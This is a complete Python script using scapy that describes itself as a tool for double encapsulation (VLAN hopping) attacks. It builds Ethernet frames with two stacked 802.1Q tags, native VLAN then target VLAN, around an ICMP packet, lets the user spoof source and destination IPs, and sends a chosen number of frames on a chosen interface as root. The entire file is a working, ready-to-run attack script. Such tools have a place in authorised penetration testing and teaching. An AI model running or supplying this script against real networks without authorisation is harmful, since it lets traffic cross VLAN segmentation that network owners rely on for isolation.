#!/usr/bin/env python3 

import sys
import argparse 
import os, subprocess
from scapy.all import *

parser = argparse.ArgumentParser(
    description="Tool for Double Encapsulation attacks"
)

parser.add_argument(
    '-i', 
	dest="INT",
	type=str,
	help="Interface which will be used",
    required=True
)

parser.add_argument(
    '-s', 
	default='0.0.0.0',
	dest="SRC_IP",
	type=str,
	help="The source ip address of the packet. Default value is \"0.0.0.0\""
)

parser.add_argument(
    '-d', 
	default='0.0.0.0',
	dest="DST_IP",
	type=str,
	help="The destination ip address of the packet. Default value is \"0.0.0.0\"",
    required=True	
)

parser.add_argument(
    '--nvid', 
	default=1,
	dest="N_VID",
	type=int,
	help="The native vlan id.  Default value is \"1\""
)

parser.add_argument(
    '--dvid', 
	default=200,
	dest="DST_VID",
	type=int,
	help="The destionation vlan id. Default value is \"200\""
)

parser.add_argument(
    '-c', 
	default=1,
	dest="COUNT",
	type=int,
	help="The number of packets will be send. Default value is \"1\""
)

args = parser.parse_args()


# Check privileges 
if os.geteuid() != 0:
    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")


# Send Packet
counter = args.COUNT
i = 0

while i < counter:
    try:
        pkt = (Ether()/Dot1Q(vlan=args.N_VID)/Dot1Q(vlan=args.DST_VID)/IP(src=args.SRC_IP, dst=args.DST_IP)/ICMP())
        sendp(pkt, iface=args.INT)
        i +=1


    except (KeyboardInterrupt):
        print("User interruption. Exiting ...")
        sys.exit(0)

sys.exit(0)

